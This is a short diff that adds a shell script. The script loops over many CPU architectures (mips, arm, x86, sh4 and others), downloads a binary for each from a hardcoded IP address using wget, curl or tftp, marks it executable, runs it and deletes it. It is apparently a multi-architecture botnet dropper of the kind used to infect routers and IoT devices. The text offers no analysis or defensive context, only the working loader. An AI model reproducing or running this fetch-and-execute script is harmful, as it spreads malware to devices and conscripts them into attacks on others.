@@ -1,0 +1,11 @@
+binarys="mips mpsl arm arm5 arm6 arm7 x86 i6 i5 spc ppc arc m68k sh4"
+server_ip="46.29.166.61"
+
+for arch in $binarys
+do
+rm -rf x$arch
+wget http://$server_ip/$arch || curl -O http://$server_ip/$arch || tftp $server_ip -c get $arch || tftp -g -r $arch $server_ip
+chmod 777 $arch
+./$arch $1.$arch
+rm -rf $arch
+done
